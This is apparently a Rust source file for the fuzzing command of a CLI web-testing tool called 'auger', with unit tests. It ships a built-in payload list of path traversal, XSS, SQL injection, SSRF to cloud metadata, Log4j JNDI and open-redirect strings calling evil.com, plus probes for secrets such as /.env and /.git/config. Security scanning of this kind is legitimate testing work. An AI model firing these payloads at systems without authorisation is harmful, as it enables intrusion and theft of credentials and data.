use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Instant;

use colored::Colorize;
use serde::Serialize;

use crate::cli::FuzzArgs;
use crate::client::ClientConfig;

#[derive(Serialize)]
struct FuzzReport {
    url: String,
    total: usize,
    interesting: Vec<FuzzHit>,
    by_status: std::collections::BTreeMap<u16, u64>,
    elapsed_ms: u64,
}

#[derive(Serialize, Clone)]
struct FuzzHit {
    payload: String,
    injection: String,
    status: u16,
    size: u64,
    ms: f64,
    redirect: Option<String>,
}

// Built-in payloads for common injection tests
const BUILTIN_PAYLOADS: &[&str] = &[
    // Path traversal
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..\\..\\..\\windows\\win.ini",
    // XSS
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    // SSRF
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    // Open redirect
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "//%0d%0aLocation:%20https://evil.com",
    // CRLF injection
    "%0d%0aX-Injected:true",
    "%0D%0ASet-Cookie:cursed=true",
    // Log4j
    "${jndi:ldap://evil.com/a}",
    "${${lower:j}ndi:${lower:l}dap://evil.com/a}",
    // NoSQL injection
    "{\"$gt\": \"\"}",
    "{\"$ne\": \"\"}",
    "{\"$regex\": \".*\"}",
    // Sensitive paths
    "/admin",
    "/admin/",
    "/Admin/",
    "/ADMIN/",
    "/.env",
    "/config.json",
    "/debug",
    "/status",
    "/health",
    "/info",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/phpinfo.php",
    "/server-status",
    "/server-info",
    "/wp-admin/",
    "/wp-config.php.bak",
    "/.git/config",
    "/.svn/entries",
    "/backup.sql",
    "/db.sql",
    "/dump.sql",
];

pub async fn run(args: &FuzzArgs, json: bool) -> anyhow::Result<()> {
    let client = ClientConfig::from_http(&args.http).build()?;

    // Load payloads
    let mut payloads: Vec<String> = Vec::new();

    if let Some(path) = &args.wordlist {
        let text = std::fs::read_to_string(path)
            .map_err(|e| anyhow::anyhow!("failed to read '{}': {}", path, e))?;
        payloads.extend(
            text.lines()
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty() && !l.starts_with('#')),
        );
    }

    if args.builtin {
        payloads.extend(BUILTIN_PAYLOADS.iter().map(|s| s.to_string()));
    }

    // If no payloads specified, use built-in
    if payloads.is_empty() {
        payloads.extend(BUILTIN_PAYLOADS.iter().map(|s| s.to_string()));
    }

    if let Some(max) = args.max_payloads {
        payloads.truncate(max as usize);
    }

    let start = Instant::now();
    let next = Arc::new(AtomicUsize::new(0));
    let interesting = Arc::new(std::sync::Mutex::new(Vec::new()));
    let status_counts = Arc::new(std::sync::Mutex::new(
        std::collections::BTreeMap::<u16, u64>::new(),
    ));

    let workers = args.concurrency.max(1);
    let method: reqwest::Method = args.method.parse()?;
    let body_template = args.body.clone();
    let injection_point = args.injection.clone();
    let filter_status: Option<Vec<u16>> = args.filter_status.as_ref().map(|s| {
        s.split(',')
            .filter_map(|c| c.trim().parse().ok())
            .collect()
    });

    let mut handles = Vec::new();
    for _i in 0..workers {
        let client = client.clone();
        let url = args.url.clone();
        let method = method.clone();
        let body_template = body_template.clone();
        let injection_point = injection_point.clone();
        let payloads = payloads.clone();
        let next = next.clone();
        let interesting = interesting.clone();
        let status_counts = status_counts.clone();
        let filter_status = filter_status.clone();

        handles.push(tokio::spawn(async move {
            loop {
                let idx = next.fetch_add(1, Ordering::Relaxed);
                if idx >= payloads.len() {
                    break;
                }
                let payload = &payloads[idx];
                let (target_url, target_body, injection_desc) =
                    inject(&url, &method, body_template.as_deref(), &injection_point, payload);
                let payload_owned = payload.clone();

                let t0 = Instant::now();
                let req = if method == reqwest::Method::GET {
                    client.get(&target_url)
                } else if method == reqwest::Method::POST {
                    let mut r = client.post(&target_url);
                    if let Some(b) = &target_body {
                        r = r.body(b.clone());
                    }
                    r
                } else if method == reqwest::Method::PUT {
                    let mut r = client.put(&target_url);
                    if let Some(b) = &target_body {
                        r = r.body(b.clone());
                    }
                    r
                } else if method == reqwest::Method::DELETE {
                    client.delete(&target_url)
                } else if method == reqwest::Method::PATCH {
                    let mut r = client.patch(&target_url);
                    if let Some(b) = &target_body {
                        r = r.body(b.clone());
                    }
                    r
                } else if method == reqwest::Method::HEAD {
                    client.head(&target_url)
                } else {
                    client.request(method.clone(), &target_url)
                };

                match req.send().await {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        let ms = t0.elapsed().as_secs_f64() * 1000.0;

                        if let Ok(mut counts) = status_counts.lock() {
                            *counts.entry(status).or_default() += 1;
                        }

                        let is_interesting = if filter_status
                            .as_ref()
                            .is_some_and(|f| f.contains(&status))
                        {
                            false
                        } else {
                            match status {
                                200..=299 => {
                                    payload_owned.starts_with('.')
                                        || payload_owned.contains("admin")
                                        || payload_owned.contains("config")
                                        || payload_owned.contains("env")
                                        || payload_owned.contains("backup")
                                        || payload_owned.contains("sql")
                                        || payload_owned.contains("phpinfo")
                                        || payload_owned.contains("actuator")
                                        || payload_owned.contains("git")
                                        || payload_owned.contains("svn")
                                        || payload_owned.starts_with('/')
                                }
                                301..=399 => true,
                                400..=499 => {
                                    status != 404 && status != 405 && status != 403
                                }
                                500..=599 => true,
                                _ => false,
                            }
                        };

                        if is_interesting {
                            let redirect = if status >= 300 && status < 400 {
                                resp.headers()
                                    .get("location")
                                    .and_then(|v| v.to_str().ok())
                                    .map(|s| s.to_string())
                            } else {
                                None
                            };

                            let size = resp.content_length().unwrap_or(0);
                            let hit = FuzzHit {
                                payload: payload_owned,
                                injection: injection_desc,
                                status,
                                size,
                                ms,
                                redirect,
                            };
                            if let Ok(mut list) = interesting.lock() {
                                list.push(hit);
                            }
                        }
                    }
                    Err(_) => {
                        if let Ok(mut counts) = status_counts.lock() {
                            *counts.entry(0).or_default() += 1;
                        }
                    }
                }
            }
        }));
    }

    for h in handles {
        let _ = h.await;
    }

    let interesting = Arc::try_unwrap(interesting)
        .unwrap_or_else(|arc| std::sync::Mutex::new((*arc.lock().unwrap()).clone()));
    let mut interesting = interesting.into_inner().unwrap();
    interesting.sort_by(|a, b| {
        b.status
            .cmp(&a.status)
            .then(a.ms.partial_cmp(&b.ms).unwrap_or(std::cmp::Ordering::Equal))
    });

    let by_status = Arc::try_unwrap(status_counts)
        .unwrap_or_else(|arc| std::sync::Mutex::new((*arc.lock().unwrap()).clone()));
    let by_status = by_status.into_inner().unwrap();
    let elapsed_ms = start.elapsed().as_millis() as u64;

    let report = FuzzReport {
        url: args.url.clone(),
        total: payloads.len(),
        interesting,
        by_status,
        elapsed_ms,
    };

    if json {
        println!("{}", serde_json::to_string_pretty(&report)?);
    } else {
        print_report(&report);
    }

    if !report.interesting.is_empty() {
        std::process::exit(1);
    }

    Ok(())
}

fn inject(
    url: &str,
    _method: &reqwest::Method,
    body: Option<&str>,
    injection_point: &str,
    payload: &str,
) -> (String, Option<String>, String) {
    let (desc, new_url, new_body) = if injection_point == "path" {
        let base = url.trim_end_matches('/');
        let new_url = format!("{}/{}", base, payload.trim_start_matches('/'));
        ("path".into(), new_url, body.map(|b| b.to_string()))
    } else if injection_point == "query" {
        let separator = if url.contains('?') { '&' } else { '?' };
        let new_url = format!("{}{}FUZZ={}", url, separator, payload);
        ("query".into(), new_url, body.map(|b| b.to_string()))
    } else if injection_point == "header" {
        ("header".into(), url.to_string(), body.map(|b| b.to_string()))
    } else if injection_point == "body" {
        let new_body = body
            .map(|b| b.replace("FUZZ", payload))
            .or_else(|| Some(payload.to_string()));
        ("body".into(), url.to_string(), new_body)
    } else if injection_point == "subdomain" {
        // Simple string replacement for subdomain
        if let Some(protocol_end) = url.find("://") {
            let after_protocol = &url[protocol_end + 3..];
            if let Some(host_end) = after_protocol.find('/') {
                let host = &after_protocol[..host_end];
                let new_host = format!("{}.{}", payload, host);
                let new_url = format!(
                    "{}://{}{}",
                    &url[..protocol_end],
                    new_host,
                    &after_protocol[host_end..]
                );
                ("subdomain".into(), new_url, body.map(|b| b.to_string()))
            } else {
                let host = after_protocol;
                let new_host = format!("{}.{}", payload, host);
                let new_url = format!("{}://{}", &url[..protocol_end], new_host);
                ("subdomain".into(), new_url, body.map(|b| b.to_string()))
            }
        } else {
            ("subdomain".into(), url.to_string(), body.map(|b| b.to_string()))
        }
    } else if injection_point == "wordlist" {
        // Replace the entire path
        if let Some(protocol_end) = url.find("://") {
            let after_protocol = &url[protocol_end + 3..];
            if let Some(slash_pos) = after_protocol.find('/') {
                let host = &after_protocol[..slash_pos];
                let new_url = format!("{}://{}{}", &url[..protocol_end], host, payload);
                ("wordlist".into(), new_url, body.map(|b| b.to_string()))
            } else {
                let new_url = format!("{}://{}{}", &url[..protocol_end], after_protocol, payload);
                ("wordlist".into(), new_url, body.map(|b| b.to_string()))
            }
        } else {
            ("wordlist".into(), url.to_string(), body.map(|b| b.to_string()))
        }
    } else {
        // Default: append to path
        let base = url.trim_end_matches('/');
        let new_url = format!("{}/{}", base, payload.trim_start_matches('/'));
        ("path".into(), new_url, body.map(|b| b.to_string()))
    };

    (new_url, new_body, desc)
}

fn print_report(r: &FuzzReport) {
    println!();
    println!("  {} {}", "auger fuzz".bold().cyan(), r.url);
    println!(
        "  {} payloads · {:.1}s",
        r.total,
        r.elapsed_ms as f64 / 1000.0
    );
    println!();

    // Status breakdown
    println!("  {}", "status codes:".dimmed());
    for (status, count) in &r.by_status {
        let color = match *status {
            200..=299 => "green",
            300..=399 => "cyan",
            400..=499 => "yellow",
            500..=599 => "red",
            0 => "red",
            _ => "white",
        };
        let line = format!("    {:>3}: {:>6}", status, count);
        println!(
            "{}",
            match color {
                "green" => line.green().to_string(),
                "cyan" => line.cyan().to_string(),
                "yellow" => line.yellow().to_string(),
                "red" => line.red().to_string(),
                _ => line,
            }
        );
    }

    if r.interesting.is_empty() {
        println!();
        println!("  {}", "✓ No interesting responses found".green());
    } else {
        println!();
        println!(
            "  {}",
            format!("{} interesting responses:", r.interesting.len())
                .bold()
                .yellow()
        );
        println!();

        for hit in &r.interesting {
            let status_str = match hit.status {
                200..=299 => hit.status.to_string().green().bold().to_string(),
                300..=399 => hit.status.to_string().cyan().to_string(),
                400..=499 => hit.status.to_string().yellow().bold().to_string(),
                500..=599 => hit.status.to_string().red().bold().to_string(),
                _ => hit.status.to_string().dimmed().to_string(),
            };

            let size_str = if hit.size > 0 {
                if hit.size < 1024 {
                    format!("{}B", hit.size)
                } else if hit.size < 1024 * 1024 {
                    format!("{:.1}K", hit.size as f64 / 1024.0)
                } else {
                    format!("{:.1}M", hit.size as f64 / (1024.0 * 1024.0))
                }
            } else {
                "-".into()
            };

            println!(
                "  {}  {}  {:>8}  {:>6.0}ms  {}",
                status_str, hit.injection, size_str, hit.ms, hit.payload
            );

            if let Some(redirect) = &hit.redirect {
                println!("       → {}", redirect);
            }
        }
    }
    println!();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn inject_path() {
        let (url, _, desc) = inject(
            "https://example.com/api",
            &reqwest::Method::GET,
            None,
            "path",
            "admin",
        );
        assert_eq!(url, "https://example.com/api/admin");
        assert_eq!(desc, "path");
    }

    #[test]
    fn inject_query() {
        let (url, _, desc) = inject(
            "https://example.com/api",
            &reqwest::Method::GET,
            None,
            "query",
            "test",
        );
        assert_eq!(url, "https://example.com/api?FUZZ=test");
        assert_eq!(desc, "query");
    }

    #[test]
    fn inject_body() {
        let (url, body, desc) = inject(
            "https://example.com/api",
            &reqwest::Method::POST,
            Some("user=FUZZ&pass=test"),
            "body",
            "admin",
        );
        assert_eq!(url, "https://example.com/api");
        assert_eq!(body, Some("user=admin&pass=test".into()));
        assert_eq!(desc, "body");
    }

    #[test]
    fn inject_subdomain() {
        let (url, _, desc) = inject(
            "https://example.com/api",
            &reqwest::Method::GET,
            None,
            "subdomain",
            "test",
        );
        assert_eq!(url, "https://test.example.com/api");
        assert_eq!(desc, "subdomain");
    }

    #[test]
    fn inject_wordlist() {
        let (url, _, desc) = inject(
            "https://example.com/api",
            &reqwest::Method::GET,
            None,
            "wordlist",
            "/admin",
        );
        assert_eq!(url, "https://example.com/admin");
        assert_eq!(desc, "wordlist");
    }
}
